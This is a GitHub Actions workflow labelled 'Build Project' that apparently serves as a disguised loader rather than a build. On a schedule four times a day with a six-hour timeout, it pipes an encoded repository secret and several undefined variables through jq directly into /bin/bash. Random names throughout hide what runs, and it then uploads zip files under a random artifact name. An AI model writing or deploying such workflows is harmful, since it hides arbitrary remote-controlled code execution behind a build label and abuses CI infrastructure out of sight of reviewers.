name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '38 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          lni6940: ${{ secrets.lni6940 }}
        run: |
          printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
          printf '%s' "$fttb26979" | jq -r .xe83 | /bin/bash
          printf '%s' "$gtb8" | jq -r .v59 | /bin/bash
          printf '%s' "$wwa774" | jq -r .rfcw2477 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: cdsaDjjx
          path: "*.zip"
          retention-days: 1
